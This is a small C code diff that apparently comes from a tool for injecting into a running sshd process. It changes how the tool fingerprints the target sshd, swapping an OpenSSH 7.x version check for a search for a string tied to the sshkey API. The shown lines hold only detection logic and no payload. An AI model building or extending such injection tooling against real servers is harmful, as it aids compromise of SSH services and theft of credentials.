@@ -58,12 +58,12 @@ void inject_ctx_init(inject_ctx *ctx, pid_t pid) {
 	fread(sshd_buf, sz, 1, f);
 	fclose(f);
 
-	ctx->is_openssh7 = 0;
+	ctx->uses_new_key_system = 0;
 
 	for(i = 0; i < sz; i++) {
-		if (memcmp(sshd_buf + i, "OpenSSH_7", 9) == 0) {
-			ctx->is_openssh7 = 1;
-			info("oh, we're dealing with OpenSSH 7.x, switching some strategies..");
+		if (memcmp(sshd_buf + i, "key_new: RSA_new failed", 23) == 0) {
+			ctx->uses_new_key_system = 1;
+			info("oh, we're dealing with an sshd that probably uses sshkey_* api..");
 			break;
 		}
 	}
